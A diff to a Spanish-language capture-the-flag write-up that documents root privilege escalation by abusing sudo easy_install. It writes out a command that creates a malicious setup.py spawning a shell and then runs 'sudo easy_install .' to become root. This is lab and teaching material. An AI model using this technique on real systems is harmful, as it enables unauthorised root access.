@@ -377,10 +377,18 @@ if __name__ == '__main__':
 Navegaremos a *GTFObins* para ver si este binario tiene explotación.
 Vemos que si que contiene una explotación conocida así que la explotaremos
 
+Este binario es parte de *setuptools* que permite ejecutar código arbitrario *Python* mediante un script `setup.py` en el directorio actual.
+
+Crearemos primero el script malicioso
 ```shell
 echo 'import os; os.system("exec /bin/sh </dev/tty >/dev/tty 2>/dev/tty")' > setup.py
 ```
 
-Y a
+Y escalaremos a root
+```shell
+sudo easy_install .
+```
+
+Obteniendo la flag de root
 
 
